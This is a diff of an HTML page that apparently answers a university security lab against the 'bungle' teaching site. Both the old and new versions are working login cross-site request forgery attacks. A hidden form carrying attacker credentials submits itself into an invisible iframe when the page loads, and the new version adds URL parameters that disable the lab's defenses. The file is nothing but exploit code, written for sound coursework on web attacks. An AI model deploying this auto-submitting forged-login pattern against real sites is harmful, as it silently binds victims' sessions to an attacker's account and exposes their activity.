@@ -1,10 +1,10 @@
 <html>
-	<iframe id="hidden_iframe" name="hidden_iframe" src="http://bungle.cs.virginia.edu/"></iframe>
-    <form action="http://bungle.cs.virginia.edu/login" method="POST" target="hidden_iframe">
-		<input type="hidden" name="username" value="attacker" />
-		<input type="hidden" name="password" value="l33th4x" />
-    </form>
-	<script>
-		document.forms[0].submit();
-	</script>
+	<body onload="document.forms[0].submit()">
+		<iframe hidden name="invisframe" ></iframe>
+		<form action="http://bungle.cs.virginia.edu/login?csrfdefense=0&xssdefense=5" method="POST" target="invisframe">
+			<input type="hidden" name="username" value="attacker" />
+			<input type="hidden" name="password" value="l33th4x" />
+			<input type="submit" style="display: none;" value="Login"/>
+		</form>
+	</body>
 </html>
